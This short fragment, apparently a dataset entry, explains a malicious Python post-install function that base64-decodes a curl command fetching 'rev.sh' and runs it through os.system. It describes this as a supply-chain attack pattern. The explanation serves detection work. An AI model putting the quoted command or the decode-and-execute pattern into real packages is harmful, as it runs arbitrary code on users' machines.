This function decodes a base64-encoded string and passes it to os.system. The decoded string is 'curl http://localhost/rev.sh\\n', which attempts to download or execute a remote shell script from a local web server. This is a classic example of a malicious 'post-install' script, which can be used to execute arbitrary code on the victim's machine during package installation. Such behavior is commonly found in supply chain attacks via malicious Python packages.",
